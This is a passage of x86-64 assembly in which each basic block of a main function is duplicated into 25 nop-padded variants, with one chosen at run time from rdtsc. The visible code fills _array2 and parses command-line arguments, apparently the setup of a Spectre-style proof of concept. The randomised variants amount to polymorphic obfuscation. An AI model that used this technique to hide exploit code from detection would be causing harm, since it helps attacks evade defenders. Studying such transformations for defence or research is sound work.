	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 1
.Lmain_win6_var1:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 2
.Lmain_win6_var2:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movl	(%r10), %eax
	jmp	.Lmain_win6_continue
## Variant 3
.Lmain_win6_var3:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	nop
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 4
.Lmain_win6_var4:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movl	(%r10), %eax
	jmp	.Lmain_win6_continue
## Variant 5
.Lmain_win6_var5:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	nop
	movslq	(%r10), %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	movb	$1, (%rax,%rcx)
	nop
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movl	(%r10), %eax
	jmp	.Lmain_win6_continue
## Variant 6
.Lmain_win6_var6:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	nop
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movl	(%r10), %eax
	jmp	.Lmain_win6_continue
## Variant 7
.Lmain_win6_var7:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	nop
	leaq	-60(%rbp), %r10
	movl	(%r10), %eax
	jmp	.Lmain_win6_continue
## Variant 8
.Lmain_win6_var8:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movl	(%r10), %eax
	jmp	.Lmain_win6_continue
## Variant 9
.Lmain_win6_var9:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	nop
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	leaq	-60(%rbp), %r10
	movl	(%r10), %eax
	jmp	.Lmain_win6_continue
## Variant 10
.Lmain_win6_var10:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	movb	$1, (%rax,%rcx)
	nop
	nop
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movl	(%r10), %eax
	jmp	.Lmain_win6_continue
## Variant 11
.Lmain_win6_var11:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movl	(%r10), %eax
	jmp	.Lmain_win6_continue
## Variant 12
.Lmain_win6_var12:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movl	(%r10), %eax
	jmp	.Lmain_win6_continue
## Variant 13
.Lmain_win6_var13:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	movb	$1, (%rax,%rcx)
	nop
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movl	(%r10), %eax
	jmp	.Lmain_win6_continue
## Variant 14
.Lmain_win6_var14:
	popq	%rax
	nop
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	nop
	movl	(%r10), %eax
	jmp	.Lmain_win6_continue
## Variant 15
.Lmain_win6_var15:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
	nop
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movl	(%r10), %eax
	nop
	jmp	.Lmain_win6_continue
## Variant 16
.Lmain_win6_var16:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	movb	$1, (%rax,%rcx)
	nop
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movl	(%r10), %eax
	jmp	.Lmain_win6_continue
## Variant 17
.Lmain_win6_var17:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	nop
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movl	(%r10), %eax
	jmp	.Lmain_win6_continue
## Variant 18
.Lmain_win6_var18:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	nop
	movl	(%r10), %eax
	jmp	.Lmain_win6_continue
## Variant 19
.Lmain_win6_var19:
	popq	%rax
	nop
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movl	(%r10), %eax
	jmp	.Lmain_win6_continue
## Variant 20
.Lmain_win6_var20:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	movb	$1, (%rax,%rcx)
	nop
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movl	(%r10), %eax
	jmp	.Lmain_win6_continue
## Variant 21
.Lmain_win6_var21:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movl	(%r10), %eax
	jmp	.Lmain_win6_continue
## Variant 22
.Lmain_win6_var22:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	nop
	jmp	.Lmain_win6_continue
## Variant 23
.Lmain_win6_var23:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	nop
	movl	(%r10), %eax
	nop
	jmp	.Lmain_win6_continue
## Variant 24
.Lmain_win6_var24:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_array2@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	leaq	-60(%rbp), %r10
	movl	(%r10), %eax
	jmp	.Lmain_win6_continue
.Lmain_win6_continue:
	addl	$1, %eax
	movl	%eax, -60(%rbp)
	jmp	LBB2_1
LBB2_4:
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$25, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win5_var0
	cmpl	$1, %eax
	je	.Lmain_win5_var1
	cmpl	$2, %eax
	je	.Lmain_win5_var2
	cmpl	$3, %eax
	je	.Lmain_win5_var3
	cmpl	$4, %eax
	je	.Lmain_win5_var4
	cmpl	$5, %eax
	je	.Lmain_win5_var5
	cmpl	$6, %eax
	je	.Lmain_win5_var6
	cmpl	$7, %eax
	je	.Lmain_win5_var7
	cmpl	$8, %eax
	je	.Lmain_win5_var8
	cmpl	$9, %eax
	je	.Lmain_win5_var9
	cmpl	$10, %eax
	je	.Lmain_win5_var10
	cmpl	$11, %eax
	je	.Lmain_win5_var11
	cmpl	$12, %eax
	je	.Lmain_win5_var12
	cmpl	$13, %eax
	je	.Lmain_win5_var13
	cmpl	$14, %eax
	je	.Lmain_win5_var14
	cmpl	$15, %eax
	je	.Lmain_win5_var15
	cmpl	$16, %eax
	je	.Lmain_win5_var16
	cmpl	$17, %eax
	je	.Lmain_win5_var17
	cmpl	$18, %eax
	je	.Lmain_win5_var18
	cmpl	$19, %eax
	je	.Lmain_win5_var19
	cmpl	$20, %eax
	je	.Lmain_win5_var20
	cmpl	$21, %eax
	je	.Lmain_win5_var21
	cmpl	$22, %eax
	je	.Lmain_win5_var22
	cmpl	$23, %eax
	je	.Lmain_win5_var23
	cmpl	$24, %eax
	je	.Lmain_win5_var24
	jmp	.Lmain_win5_var0
## Variant 0
.Lmain_win5_var0:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 1
.Lmain_win5_var1:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	nop
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	leaq	8(%rax), %r10
	movq	(%r10), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 2
.Lmain_win5_var2:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	leaq	8(%rax), %r10
	movq	(%r10), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 3
.Lmain_win5_var3:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	nop
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	leaq	8(%rax), %r10
	movq	(%r10), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 4
.Lmain_win5_var4:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	leaq	8(%rax), %r10
	movq	(%r10), %rdi
	nop
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 5
.Lmain_win5_var5:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	leaq	8(%rax), %r10
	movq	(%r10), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 6
.Lmain_win5_var6:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	nop
	leaq	8(%rax), %r10
	movq	(%r10), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 7
.Lmain_win5_var7:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	leaq	8(%rax), %r10
	movq	(%r10), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 8
.Lmain_win5_var8:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	nop
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	leaq	8(%rax), %r10
	movq	(%r10), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 9
.Lmain_win5_var9:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	leaq	-32(%rbp), %r10
	nop
	movq	(%r10), %rax
	leaq	8(%rax), %r10
	movq	(%r10), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 10
.Lmain_win5_var10:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	leaq	8(%rax), %r10
	movq	(%r10), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 11
.Lmain_win5_var11:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	nop
	nop
	nop
	jmp	.Lmain_win5_continue
## Variant 12
.Lmain_win5_var12:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	leaq	8(%rax), %r10
	movq	(%r10), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 13
.Lmain_win5_var13:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	leaq	8(%rax), %r10
	movq	(%r10), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 14
.Lmain_win5_var14:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	nop
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	nop
	leaq	8(%rax), %r10
	movq	(%r10), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 15
.Lmain_win5_var15:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	leaq	8(%rax), %r10
	movq	(%r10), %rdi
	nop
	leaq	L_.str.1(%rip), %rsi
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 16
.Lmain_win5_var16:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
## %bb.5:
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	leaq	8(%rax), %r10
	movq	(%r10), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 17
.Lmain_win5_var17:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	leaq	8(%rax), %r10
	movq	(%r10), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 18
.Lmain_win5_var18:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	nop
	jmp	.Lmain_win5_continue
## Variant 19
.Lmain_win5_var19:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	leaq	8(%rax), %r10
	movq	(%r10), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	nop
	jmp	.Lmain_win5_continue
## Variant 20
.Lmain_win5_var20:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
## %bb.5:
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	nop
	leaq	8(%rax), %r10
	movq	(%r10), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 21
.Lmain_win5_var21:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	leaq	8(%rax), %r10
	movq	(%r10), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 22
.Lmain_win5_var22:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
## %bb.5:
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	nop
	leaq	8(%rax), %r10
	movq	(%r10), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	nop
	jmp	.Lmain_win5_continue
## Variant 23
.Lmain_win5_var23:
	popq	%rax
	cmpl	$2, -24(%rbp)
	nop
	jl	LBB2_6
## %bb.5:
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	leaq	8(%rax), %r10
	movq	(%r10), %rdi
	nop
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 24
.Lmain_win5_var24:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
.Lmain_win5_continue:
	movb	$0, %al
	callq	_sscanf
LBB2_6:
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$25, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win4_var0
	cmpl	$1, %eax
	je	.Lmain_win4_var1
	cmpl	$2, %eax
	je	.Lmain_win4_var2
	cmpl	$3, %eax
	je	.Lmain_win4_var3
	cmpl	$4, %eax
	je	.Lmain_win4_var4
	cmpl	$5, %eax
	je	.Lmain_win4_var5
	cmpl	$6, %eax
	je	.Lmain_win4_var6
	cmpl	$7, %eax
	je	.Lmain_win4_var7
	cmpl	$8, %eax
	je	.Lmain_win4_var8
	cmpl	$9, %eax
	je	.Lmain_win4_var9
	cmpl	$10, %eax
	je	.Lmain_win4_var10
	cmpl	$11, %eax
	je	.Lmain_win4_var11
	cmpl	$12, %eax
	je	.Lmain_win4_var12
	cmpl	$13, %eax
	je	.Lmain_win4_var13
	cmpl	$14, %eax
	je	.Lmain_win4_var14
	cmpl	$15, %eax
	je	.Lmain_win4_var15
	cmpl	$16, %eax
	je	.Lmain_win4_var16
	cmpl	$17, %eax
	je	.Lmain_win4_var17
	cmpl	$18, %eax
	je	.Lmain_win4_var18
	cmpl	$19, %eax
	je	.Lmain_win4_var19
	cmpl	$20, %eax
	je	.Lmain_win4_var20
	cmpl	$21, %eax
	je	.Lmain_win4_var21
	cmpl	$22, %eax
	je	.Lmain_win4_var22
	cmpl	$23, %eax
	je	.Lmain_win4_var23
	cmpl	$24, %eax
	je	.Lmain_win4_var24
	jmp	.Lmain_win4_var0
## Variant 0
.Lmain_win4_var0:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 1
.Lmain_win4_var1:
	popq	%rax
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 2
.Lmain_win4_var2:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	nop
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 3
.Lmain_win4_var3:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	leaq	16(%rax), %r10
	movq	(%r10), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 4
.Lmain_win4_var4:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	leaq	16(%rax), %r10
	movq	(%r10), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 5
.Lmain_win4_var5:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 6
.Lmain_win4_var6:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	nop
	nop
	nop
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 7
.Lmain_win4_var7:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	nop
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 8
.Lmain_win4_var8:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	nop
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	leaq	16(%rax), %r10
	movq	(%r10), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 9
.Lmain_win4_var9:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	leaq	16(%rax), %r10
	movq	(%r10), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 10
.Lmain_win4_var10:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	leaq	-32(%rbp), %r10
	movq	(%r10), %rax
	leaq	16(%rax), %r10
	movq	(%r10), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 11
.Lmain_win4_var11:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	nop
	nop
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 12
.Lmain_win4_var12:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	nop
	nop
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 13
.Lmain_win4_var13:
	popq	%rax
